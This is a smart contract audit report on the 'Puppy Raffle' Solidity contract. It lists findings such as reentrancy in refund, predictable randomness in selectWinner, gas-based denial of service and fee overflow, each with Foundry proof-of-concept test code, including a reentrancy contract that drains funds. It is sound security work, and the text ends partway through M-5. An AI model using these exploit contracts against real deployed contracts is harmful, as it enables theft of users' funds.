# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

**Puppy Raffle** is an on-chain raffle that sells ERC-721 “puppy” NFTs as prizes while sharing the ether pot with the winner. Each round lasts a fixed number of seconds. Anyone can purchase tickets for one or more addresses by calling `enterRaffle` and sending `entranceFee × tickets`; duplicate addresses are rejected to keep odds fair. Players may exit before the draw via `refund`, getting their ETH back and freeing their slot.

When the countdown expires and at least four active players exist, any account can trigger `selectWinner`. The contract pseudo-randomly picks one live address, pays out 80 % of the accumulated ETH to that address, mints a new Puppy NFT to them, and moves 20 % of the pot into a fee pool. NFT art & metadata are stored fully on-chain/IPFS and labelled **“common”**, **“rare”**, or **“legendary”** based on weighted probabilities (70/25/5).

The owner can update the fee recipient address and later pull the cached fees with `withdrawFees`, but only when no players are active. All logic lives in a single Solidity 0.7.6 contract, making the system compact and auditable.
## High Risk Findings
[H-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[H-2]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
[H-3]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::selectWinner
[H-4]. Reentrancy issue in PuppyRaffle::refund
[H-5]. Gas Grief BlockLimit issue in PuppyRaffle::refund
## Medium Risk Findings
[M-1]. Randomness issue in PuppyRaffle::selectWinner
[M-2]. Integer Overflow issue in PuppyRaffle::selectWinner
[M-3]. DOS issue in PuppyRaffle::enterRaffle
[M-4]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-5]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-6]. Event Consistency issue in PuppyRaffle::tokenURI
[M-7]. Unexpected Eth issue in PuppyRaffle::selectWinner
[M-8]. Array Limits issue in PuppyRaffle::refund
[M-9]. Integer Overflow/Math issue in PuppyRaffle::withdrawFees
[M-10]. Array Limits issue in PuppyRaffle::selectWinner
[M-11]. Array Limits issue in PuppyRaffle::enterRaffle
[M-12]. Array Limits issue in PuppyRaffle::enterRaffle
[M-13]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[M-14]. Unexpected Eth issue in PuppyRaffle::NA
## Low Risk Findings
[L-1]. Event Consistency issue in PuppyRaffle::selectWinner
[L-2]. Integer Overflow/Math issue in PuppyRaffle::getActivePlayerIndex
[L-3]. Array Limits issue in PuppyRaffle::getActivePlayerIndex
[L-4]. Unchecked Return issue in PuppyRaffle::selectWinner
[L-5]. Event Consistency issue in PuppyRaffle::withdrawFees
## Info Risk Findings
[I-1]. Pragma issue in PuppyRaffle::NA
[I-2]. Event Consistency issue in PuppyRaffle::getActivePlayerIndex
[I-3]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
[I-4]. Default Visibility issue in PuppyRaffle::getActivePlayerIndex
[I-5]. Event Consistency issue in PuppyRaffle::NA
[I-6]. Default Visibility issue in PuppyRaffle::NA


### Number of Findings
- H: 5
- M: 14
- L: 5
- I: 6



# High Risk Findings

## [H-1]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function has an inefficient duplicate checking algorithm. It uses a nested loop to check for duplicates among the existing players and new players. This results in a quadratic time complexity (O(n²)), where n is the number of players. As the number of players increases, the gas cost will increase dramatically, potentially causing the transaction to exceed the block gas limit, making the function unusable.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    // Other code...
    
    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    
    // Other code...
}
```

## Impact
The gas consumption of the function grows quadratically with the number of players. This can lead to transactions that exceed the block gas limit, effectively making the raffle unusable after a certain number of participants. This creates a denial of service vulnerability that breaks the core functionality of the contract.

## Proof of Concept
1. Prepare an array with 3 000 unique addresses and pay `entranceFee * 3 000` wei.
2. Call `enterRaffle(players)`. 3 000 addresses are appended and then the duplicate-check executes about (3 000 × 2 999) / 2 ≈ 4.5 million pairwise `SLOAD` comparisons.
3. On main-net this costs ~18 M gas today. Repeating the attack with ~4 200 addresses pushes the cost to ~32 M gas – above the 30 M block limit – so the transaction will run out-of-gas and revert, preventing any further players from entering until someone wins and `players` is reset manually.
4. Because the cost grows quadratically, an attacker has a predictable knob (number of addresses supplied) to force any `enterRaffle` call to revert once the player list becomes large enough, effectively freezing the raffle.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract GasGriefTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE = 1 ether;
    address fee = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE, fee, 1 days);
    }

    // Helper that creates an array of `n` distinct EOAs
    function _makePlayers(uint256 n) internal pure returns (address[] memory a) {
        a = new address[](n);
        for (uint256 i; i < n; ++i) a[i] = address(uint160(i + 1));
    }

    function testGasExplodesQuadratically() public {
        // enter with 250 players and record gas to add one more
        address[] memory first = _makePlayers(250);
        raffle.enterRaffle{value: ENTRANCE * 250}(first);

        address[] memory extra = _makePlayers(1);
        uint256 g1 = gasleft();
        raffle.enterRaffle{value: ENTRANCE}(extra);
        g1 -= gasleft();

        // now enter 250 more players (total = 501) and again record gas for adding 1
        address[] memory second = _makePlayers(250);
        raffle.enterRaffle{value: ENTRANCE * 250}(second);

        extra[0] = address(0xDEAD);
        uint256 g2 = gasleft();
        raffle.enterRaffle{value: ENTRANCE}(extra);
        g2 -= gasleft();

        // confirm quadratic growth: gas roughly quadruples when n doubles
        assertGt(g2, g1 * 2);
    }
}

## Suggested Mitigation
Replace the nested loop duplicate checking algorithm with a more efficient approach using a mapping to track addresses that have already entered the raffle:

```solidity
// Add a mapping to track active players
mapping(address => bool) public isActivePlayer;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        
        // Check if address is already in the raffle
        require(!isActivePlayer[player], "PuppyRaffle: Duplicate player");
        
        // Add to players array and mark as active
        players.push(player);
        isActivePlayer[player] = true;
    }
    
    emit RaffleEnter(newPlayers);
}

// Update refund function to maintain the mapping
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Mark player as inactive
    isActivePlayer[playerAddress] = false;
    
    players[playerIndex] = address(0);
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}

// Update selectWinner to reset the mapping
function selectWinner() external {
    // ... existing code ...
    
    // Reset player tracking
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] != address(0)) {
            isActivePlayer[players[i]] = false;
        }
    }
    delete players;
    
    // ... rest of the function ...
}
```

This approach reduces the complexity from O(n²) to O(n), making the function much more gas efficient and eliminating the potential for block gas limit issues.

## [H-2]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses `block.timestamp` and `block.difficulty` for randomness generation. These values can be manipulated by miners to some degree, making the randomness predictable and potentially exploitable. Miners can influence these values to bias the winner selection in their favor.

Vulnerable code:
```solidity
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

## Impact
Because msg.sender is part of the entropy, *any* participant (not just a miner) can pre-compute the raffle outcome off-chain for every admissible timestamp in the ±900-second window that validators accept. The attacker simply waits until a moment when the hash resolves to one of his tickets and then calls selectWinner himself. He therefore wins the NFT and 80 % of the ETH pool with probability 1, defeating the fairness of the raffle and economically harming honest players.

## Proof of Concept
1. Attacker funds several addresses and enters them into the raffle.
2. Off-chain, he enumerates candidate timestamps t ∈ [raffleEnd, raffleEnd+900] (the range miners can publish).
3. For each t he computes idx = keccak256(attackerAddress, t, currentDifficulty) % players.length.
4. If players[idx] equals one of his addresses, he sends a selectWinner transaction with gas price high enough to be included in a block whose timestamp is t.
5. Because the hash is fully predictable, the call is executed exactly when the attacker will be picked, giving him the whole prize pool.

No special miner privileges are required – the attacker only needs the ability to choose when to call selectWinner, something any user has.

## Proof of Code
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract PredictableRandomnessTest is Test {
    PuppyRaffle raffle;
    uint256 entrance = 0.1 ether;
    uint256 duration = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(entrance, address(0xFEED), duration);
    }

    function testAttackerGuaranteesWin() public {
        // Prepare players (4 honest + 1 attacker)
        address attacker = address(0xBEEF);
        address[4] memory honest = [address(0x1), address(0x2), address(0x3), address(0x4)];
        vm.deal(attacker, 10 ether);
        address[] memory all = new address[](5);
        for (uint256 i; i < 4; i++) all[i] = honest[i];
        all[4] = attacker;

        vm.prank(attacker);
        raffle.enterRaffle{value: entrance * 5}(all);

        // --- attacker searches for a winning timestamp ---
        uint256 baseTs = block.timestamp + duration; // raffle end
        uint256 targetTs;
        for (uint256 i; i < 900; i++) {
            uint256 ts = baseTs + i;
            uint256 idx = uint256(keccak256(abi.encodePacked(attacker, ts, block.difficulty))) % 5;
            if (all[idx] == attacker) { // attacker wins at this ts
                targetTs = ts;
                break;
            }
        }
        require(targetTs != 0, "no winning ts found (should not happen)");

        // fast-forward chain time to the chosen timestamp
        vm.warp(targetTs);

        // attacker calls selectWinner knowing he will win
        vm.prank(attacker);
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), attacker, "attacker did not win as predicted");
    }
}

## Suggested Mitigation
Use a commit-reveal scheme or integrate with Chainlink VRF for truly random number generation:

```solidity
import "@chainlink/contracts/src/v0.8/VRFConsumerBase.sol";

contract PuppyRaffle is VRFConsumerBase {
    bytes32 internal keyHash;
    uint256 internal fee;
    uint256 public randomResult;
    
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        
        requestRandomness(keyHash, fee);
    }
    
    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        uint256 winnerIndex = randomness % players.length;
        // Rest of winner selection logic
    }
}
```

## [H-3]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::selectWinner

## Description
The selectWinner function contains a front-running vulnerability where the winner selection can be manipulated. Since winner selection depends on msg.sender, block.timestamp, and block.difficulty, an attacker can observe pending selectWinner transactions and front-run them with their own transaction to influence the outcome:

```solidity
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

## Impact
Because the random seed is derived from msg.sender, block.timestamp and block.difficulty, anyone (or a colluding miner) can pick the call-address and slightly nudge the timestamp to force the hash to point to their own index in the players array. A malicious miner can achieve 100 % win-rate; a regular user with multiple participating addresses can raise the win probability far above the intended 1/N fairness. This breaks the economic integrity of the raffle and directly diverts the prize pool.

## Proof of Concept
1. Attacker funds four addresses and makes sure one of them (A) is stored at index 0 of `players`.
2. After the raffle period, the attacker (or a colluding miner) iterates over admissible timestamps (≤ 30-second drift is miner-legal).
3. They find a timestamp `t` such that `keccak256(abi.encodePacked(A, t, block.difficulty)) % players.length == 0`.
4. The miner sets `block.timestamp = t` and includes the attacker’s `selectWinner` transaction as the first tx of the block.
5. The contract inevitably selects `players[0]` – the attacker – as winner, sending them the whole prize pool and minting the NFT.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RandomnessManipulationTest is Test {
    PuppyRaffle raffle;
    uint256 constant TICKET = 1 ether;
    address feeAddr = address(0xfee);

    address attacker = address(0xA11CE);
    address p1 = address(0xBEEF);
    address p2 = address(0xCAFE);
    address p3 = address(0xDEAD);

    function setUp() public {
        raffle = new PuppyRaffle(TICKET, feeAddr, 1 days);
        vm.deal(address(this), 10 ether);

        address[] memory players = new address[](4);
        players[0] = attacker; // attacker is at index 0
        players[1] = p1;
        players[2] = p2;
        players[3] = p3;

        raffle.enterRaffle{value: TICKET * 4}(players);
    }

    function testAttackSucceeds() public {
        // Advance time to after raffle period
        uint256 baseTs = block.timestamp + 1 days + 1;
        uint256 chosenTs = baseTs;
        // brute-force a legal timestamp drift (≤30 sec) that lets attacker win
        for (uint256 i; i < 30; i++) {
            uint256 cand = baseTs + i;
            uint256 idx = uint256(keccak256(abi.encodePacked(attacker, cand, block.difficulty))) % 4;
            if (idx == 0) { // attacker’s position
                chosenTs = cand;
                break;
            }
        }
        vm.warp(chosenTs);

        vm.prank(attacker);
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), attacker, "attacker should win");
        assertEq(raffle.ownerOf(0), attacker, "NFT should be minted to attacker");
    }
}

## Suggested Mitigation
Replace the current pseudo-randomness with a verifiable random source such as Chainlink VRF or a two-phase commit-reveal scheme. For example, request a VRF random word when the raffle closes and use the returned value to derive both the `winnerIndex` and token rarity. Remove all miner-controlled parameters (block.*) and msg.sender from the seed.

## [H-4]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function in the PuppyRaffle contract sends ETH to a user before updating state variables, creating a reentrancy vulnerability. An attacker can repeatedly refund themselves by creating a malicious contract that calls back into `refund` during the ETH transfer.

```solidity
function refund(uint256 playerIndex) public {
    // ...
    address playerAddress = players[playerIndex];
    // ...
    payable(msg.sender).sendValue(entranceFee); // Sends ETH before updating state
    players[playerIndex] = address(0);          // Updates state after external call
    // ...
}
```

## Impact
An attacker can repeatedly claim refunds for the same entry, draining the contract of funds. This vulnerability allows an attacker to steal more ETH than they initially deposited, potentially emptying the entire contract balance.

## Proof of Concept
1. Deploy PuppyRaffle with 1 ETH entrance fee.
2. Four honest users enter so the contract holds 4 ETH.
3. Attacker contract deposits 1 ETH through enterRaffle and stores its array index.
4. Attacker triggers refund(index). During the ETH transfer the receive() hook re-enters refund(index) before the player slot is cleared, allowing multiple refunds in the same transaction.
5. Loop continues until the contract balance is exhausted, giving the attacker more ETH than deposited.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract Reenter {
    PuppyRaffle public raffle;
    uint256 public idx;
    bool private attacking;

    constructor(PuppyRaffle _raffle) payable {
        raffle = _raffle;
    }

    function beginAttack() external payable {
        // 1 ticket for this contract
        address[] memory arr = new address[](1);
        arr[0] = address(this);
        raffle.enterRaffle{value: msg.value}(arr);
        idx = raffle.getActivePlayerIndex(address(this));
        attacking = true;
        raffle.refund(idx);
        attacking = false;
    }

    receive() external payable {
        if (attacking && address(raffle).balance >= raffle.entranceFee()) {
            raffle.refund(idx);
        }
    }
}

contract ReentrancyTest is Test {
    PuppyRaffle raffle;
    Reenter attacker;
    uint256 fee = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(fee, address(0xdead), 1 days);
        // seed contract with 4 honest players (4 ether)
        address[] memory others = new address[](4);
        others[0] = address(0x10);
        others[1] = address(0x11);
        others[2] = address(0x12);
        others[3] = address(0x13);
        raffle.enterRaffle{value: fee * 4}(others);

        attacker = new Reenter(raffle);
        vm.deal(address(attacker), fee);
    }

    function testReentrancy() public {
        uint256 startAttacker = address(attacker).balance;
        uint256 startRaffle   = address(raffle).balance;

        vm.prank(address(attacker));
        attacker.beginAttack{value: fee}();

        uint256 gained = address(attacker).balance - startAttacker;
        uint256 lost   = startRaffle - address(raffle).balance;

        assertGt(gained, fee, "attacker should gain > 1 ticket price");
        assertGt(lost,   fee, "raffle lost more than single refund");
    }
}

## Suggested Mitigation
Move `players[playerIndex] = address(0);` before `sendValue`, or protect the function with OpenZeppelin’s `ReentrancyGuard` so re-entrant calls revert.

## [H-5]. Gas Grief BlockLimit issue in PuppyRaffle::refund

## Description
The PuppyRaffle contract has a critical array manipulation vulnerability in the `refund` function. When a player requests a refund, their address is replaced with `address(0)` in the players array, but the array length remains unchanged. This creates two serious issues:

1. The duplicate player check in `enterRaffle` compares each player against every other player, but it doesn't skip zero addresses. This means that after refunds, the contract must process many unnecessary comparisons.

2. As more players get refunds, the gas cost for new entries increases dramatically since the players array keeps growing with empty spots that are still processed in the nested loops.

Vulnerable code:
```solidity
function refund(uint256 playerIndex) public {
    // @audit problematic pattern - setting to address(0) but not reducing array size
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // @audit address is zeroed out but still in array
    players[playerIndex] = address(0);
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}
```

## Impact
After at least two players call refund(), the players array holds two identical address(0) values. The duplicate-detection logic in enterRaffle() sees those duplicates and reverts with “PuppyRaffle: Duplicate player”. From this moment on, no one can buy a ticket, selectWinner() can never be reached because it also requires players.length ≥ 4, and all ETH already in the contract is locked forever. This is a permanent denial-of-service of the whole raffle, not just a gas inflation.

## Proof of Concept
1. Two users enter the raffle.
2. Both users call refund(), producing two address(0) entries in the players array.
3. Any subsequent call to enterRaffle() reverts with "PuppyRaffle: Duplicate player", freezing the protocol.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RefundDuplicateDOSTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(1), 1 days);
    }

    function testRefundCreatesPermanentDOS() public {
        address p1 = address(0xBEEF);
        address p2 = address(0xCAFE);

        address[] memory entrants = new address[](2);
        entrants[0] = p1;
        entrants[1] = p2;
        raffle.enterRaffle{value: 2 * FEE}(entrants);

        vm.prank(p1);
        raffle.refund(0);
        vm.prank(p2);
        raffle.refund(1);

        address[] memory newPlayer = new address[](1);
        newPlayer[0] = address(0xABCD);

        vm.expectRevert("PuppyRaffle: Duplicate player");
        raffle.enterRaffle{value: FEE}(newPlayer);
    }
}

## Suggested Mitigation
Either (a) compact the players array in refund() by swapping the element with the last one and popping, or (b) keep the current sparse array but modify the duplicate-check loop to `continue` when players[i]==address(0) || players[j]==address(0). Approach (a) is cheaper and completely removes the DoS vector.



# Medium Risk Findings

## [M-1]. Randomness issue in PuppyRaffle::selectWinner

## Description
The selectWinner function uses block.timestamp and block.difficulty as entropy sources for randomness. These values are controlled or influenced by miners and can be manipulated to some degree, making the randomness predictable or biasable.

Vulnerable code:
```solidity
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

## Impact
Miners can manipulate block.timestamp within a small range and influence block.difficulty. Large players or miners could potentially bias the selection toward favorable outcomes, undermining the fairness of the raffle.

## Proof of Concept
A miner (or any block producer) can pre-compute winnerIndex for every admissible timestamp (within ±900 seconds of the parent block). If any timestamp makes his own address win, he simply includes the selectWinner transaction in a block whose timestamp equals that value; otherwise he withholds the transaction. This strategy gives the miner a strictly better than 1/N chance.

Pseudo-algorithm
1. Attacker funds 1 ticket and ensures at least 3 others are in the raffle.
2. For each ts in [raffleEnd, raffleEnd+900]:
   compute idx = keccak256(msg.sender, ts, futureDifficulty) % players.length
   if idx == attackerIndex → publish tx with that timestamp.
3. The attacker publishes the block only when he wins, discarding the rest, biasing selection.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract WeakRandomnessBiasTest is Test {
    PuppyRaffle raffle;
    uint256 entrance = 1 ether;
    address attacker = address(0xBEEF);

    function setUp() public {
        raffle = new PuppyRaffle(entrance, address(0xFEES), 1 days);
        vm.deal(attacker, 10 ether);
        vm.deal(address(1), 10 ether);
        vm.deal(address(2), 10 ether);
        vm.deal(address(3), 10 ether);
        vm.deal(address(4), 10 ether);

        address[] memory p = new address[](5);
        p[0] = attacker; // attacker is index 0
        p[1] = address(1);
        p[2] = address(2);
        p[3] = address(3);
        p[4] = address(4);
        vm.prank(attacker);
        raffle.enterRaffle{value: entrance * 5}(p);

        // fast-forward until raffle can be closed
        vm.warp(block.timestamp + 1 days + 1);
    }

    function testMinerCanPickWinningTimestamp() public {
        uint256 base = block.timestamp;
        uint256 attackerIndex = 0;
        // search a timestamp in the next 900 seconds that lets attacker win
        uint256 chosen = 0;
        for (uint256 i = 0; i <= 900; i++) {
            uint256 ts = base + i;
            uint256 idx = uint256(keccak256(abi.encodePacked(attacker, ts, block.difficulty))) % 5;
            if (idx == attackerIndex) {
                chosen = ts;
                break;
            }
        }
        assertGt(chosen, 0, "should find a favourable timestamp within 900s window");

        // Miner publishes block with favourable timestamp
        vm.warp(chosen);
        vm.prank(attacker);
        raffle.selectWinner();

        assertEq(raffle.previousWinner(), attacker, "attacker became winner by timestamp selection");
    }
}

## Suggested Mitigation
Use Chainlink VRF (Verifiable Random Function) for provably fair randomness:
```solidity
import "@chainlink/contracts/src/v0.8/VRFConsumerBase.sol";

contract PuppyRaffle is VRFConsumerBase {
    bytes32 internal keyHash;
    uint256 internal fee;
    uint256 public randomResult;
    
    function getRandomNumber() public returns (bytes32 requestId) {
        require(LINK.balanceOf(address(this)) >= fee, "Not enough LINK");
        return requestRandomness(keyHash, fee);
    }
    
    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        randomResult = randomness;
        // Use randomResult for winner selection
    }
}
```

## [M-2]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
The contract stores totalFees as uint64 but calculations use uint256. This creates a potential for integer overflow when casting from uint256 to uint64, especially as fees accumulate over time.

Vulnerable code:
```solidity
uint64 public totalFees = 0;
// ...
totalFees = totalFees + uint64(fee);
```

## Impact
When `totalFees` exceeds the `uint64` limit (≈18.44 ETH) the down-cast silently truncates the value. Because `withdrawFees()` requires `address(this).balance == totalFees`, any truncation makes that equality fail forever and the function becomes unusable. All protocol fees collected after the overflow are therefore stuck in the contract and can never be withdrawn by the fee receiver.

## Proof of Concept
1. Deploy PuppyRaffle with any parameters (e.g. entranceFee = 1 ETH).
2. Manually set storage slot 5 (`totalFees`) to `2**64-1 − 0.1 ETH`.
3. Run a single raffle that charges ≥0.1 ETH fee.
4. `totalFees` wraps around to a very small value while the contract balance increases.
5. Calling `withdrawFees()` now reverts forever because `address(this).balance` (≈18 ETH) ≠ `totalFees` (≈0 ETH).

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract FeeOverflowTest is Test {
    PuppyRaffle raffle;
    address feeCollector = address(100);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, feeCollector, 1); // entranceFee = 1 ETH
    }

    function testFeeOverflowLocksFunds() public {
        // 1. Move totalFees close to the uint64 limit
        uint64 nearMax = type(uint64).max - 0.5 ether;
        // slot 5 = totalFees (see storage layout)
        vm.store(address(raffle), bytes32(uint256(5)), bytes32(uint256(nearMax)));

        // 2. Prepare four players and let one account pay for them
        address payer = address(1);
        vm.deal(payer, 10 ether);
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);

        vm.startPrank(payer);
        raffle.enterRaffle{value: 4 ether}(players);
        vm.warp(block.timestamp + 2); // raffle duration passed
        raffle.selectWinner(); // adds 0.8 ether fee and causes overflow
        vm.stopPrank();

        // 3. totalFees wrapped around and is now less than 1 ether
        assertLt(raffle.totalFees(), 1 ether);

        // 4. withdrawFees should revert because equality check fails
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Store `totalFees` as `uint256` (or a size large enough for expected lifetime volume) and rely on Solidity ≥0.8 built-in overflow checks, e.g.:

uint256 public totalFees;
...
unchecked { totalFees += fee; } // fee is uint256

Alternatively, keep `uint64` but add an explicit bound check before the addition:

require(totalFees + fee <= type(uint64).max, "fee overflow");


## [M-3]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function has a denial of service vulnerability due to an O(n²) duplicate check. For each new player, the function performs nested loops to check for duplicates against all existing players. As the players array grows, gas consumption increases quadratically, eventually hitting the block gas limit. An attacker can grief the protocol by filling the players array with many addresses, making it impossible for new players to join. The vulnerable code:

```solidity
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

## Impact
The protocol becomes unusable as the players array grows. New players cannot join the raffle once approximately 100-200 players are registered due to gas limit constraints. This breaks the core functionality and can be weaponized by attackers to permanently disable new entries.

## Proof of Concept
1. The attacker enters one unique address at a time until the players array grows to the critical size `N_max` where `enterRaffle` barely succeeds.  
2. Now, for `N_max+1` players the quadratic duplicate-check requires > 8 000 000 gas.  
3. Any subsequent `enterRaffle` call (even with only 1 address) sent with the usual 8 000 000 gas stipend runs out of gas and reverts, so no one can join the raffle until the round is completed.
4. The attacker can repeat the same procedure after every round, keeping the raffle perpetually closed to new users.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract GasDoSTest is Test {
    PuppyRaffle raffle;
    uint256 constant BATCHES = 600; // empirically enough to hit gas ceiling

    function setUp() public {
        raffle = new PuppyRaffle({
            _entranceFee: 1 ether,
            _feeAddress: address(0xFEE),
            _raffleDuration: 1 days
        });
    }

    function testGasExplodes() public {
        address attacker = address(0xBEEF);
        vm.deal(attacker, 2000 ether);

        // grow players array gradually so each tx still fits in the block gas limit
        for (uint256 i; i < BATCHES; ++i) {
            address[] memory a = new address[](1);
            a[0] = address(uint160(i + 1));
            vm.prank(attacker);
            raffle.enterRaffle{value: 1 ether}(a);
        }

        // adding one more player with the common 8M gas stipend should now fail
        address[] memory extra = new address[](1);
        extra[0] = address(0xCAFE);

        vm.prank(attacker);
        (bool success, ) = address(raffle).call{value: 1 ether, gas: 8_000_000}(
            abi.encodeWithSelector(raffle.enterRaffle.selector, extra)
        );

        assertTrue(!success, "enterRaffle should run out of gas and revert");
    }
}

## Suggested Mitigation
Track registered players in a mapping (`mapping(address => bool) public isPlayer`).  Check `require(!isPlayer[newPlayer])` before pushing and set `isPlayer[newPlayer] = true`.  In `refund` and in `selectWinner` (after `delete players`) iterate over the removed addresses or, more cheaply, reset the mapping to `false` so that the next round can start with a clean slate.

## [M-4]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function has a strict equality check that prevents fee withdrawal when there are active players:

```solidity
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

If anyone sends ETH directly to the contract (e.g., via selfdestruct, coinbase rewards, or accidental transfers), this balance check will always fail, permanently locking the fees in the contract.

## Impact
Accumulated protocol fees become permanently locked and unwithdrawable if any unexpected ETH is sent to the contract. This results in financial loss for the protocol as fee revenue cannot be recovered.

## Proof of Concept
1. Contract accumulates fees over multiple raffle rounds
2. Someone accidentally sends ETH to contract or uses selfdestruct to force ETH
3. Contract balance becomes greater than totalFees
4. withdrawFees function permanently fails the equality check
5. All accumulated fees become locked forever
6. Protocol loses all fee revenue

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract PuppyRaffle_UnexpectedEthTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 0.1 ether;
    uint256 constant DURATION      = 1 days;
    address constant FEE_ADDRESS   = address(0xfee);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, DURATION);
    }

    function test_unexpectedEthLocksFees() public {
        // ‑- Arrange --------------------------------------------------------
        address[] memory players = new address[](4);
        players[0] = address(0x1);
        players[1] = address(0x2);
        players[2] = address(0x3);
        players[3] = address(0x4);

        deal(address(this), 10 ether);
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);

        vm.warp(block.timestamp + DURATION + 1);
        raffle.selectWinner(); // fees are now stored in contract

        // Force 1 ether into the contract via self-destruct
        SelfDestructor sd = new SelfDestructor();
        deal(address(sd), 1 ether);
        sd.destroy(payable(address(raffle)));

        // ‑- Act / Assert ---------------------------------------------------
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

contract SelfDestructor {
    function destroy(address payable target) external {
        selfdestruct(target);
    }
    receive() external payable {}
}

## Suggested Mitigation
Change the strict equality check to allow withdrawal when balance is at least equal to totalFees:

```solidity
function withdrawFees() external {
    require(address(this).balance >= uint256(totalFees), "PuppyRaffle: Insufficient contract balance");
    require(players.length == 0, "PuppyRaffle: There are currently players active!");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [M-5]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The `refund` function marks a player's address as `address(0)` but doesn't reduce the array length, creating a discrepancy between the total collected fees and the actual number of participants. When `selectWinner` calculates `totalAmountCollected`, it uses the array length which includes refunded players, resulting in an inflated total amount that doesn't match the actual ETH in the contract.

## Impact
Refunding two or more tickets leaves several `address(0)` entries in `players`. Because duplicates are forbidden, any subsequent `enterRaffle` call reverts, and `selectWinner` also reverts because it computes a prize pool that exceeds the contract’s balance. The attacker can therefore freeze the raffle indefinitely with very little capital, stopping new rounds and preventing fee withdrawals (owner can withdraw fees only when `players` is empty).

## Proof of Concept
1. Attacker funds 4+ throw-away EOAs and enters the raffle with them.
2. The same EOAs immediately call `refund`, producing at least two `address(0)` entries in `players`.
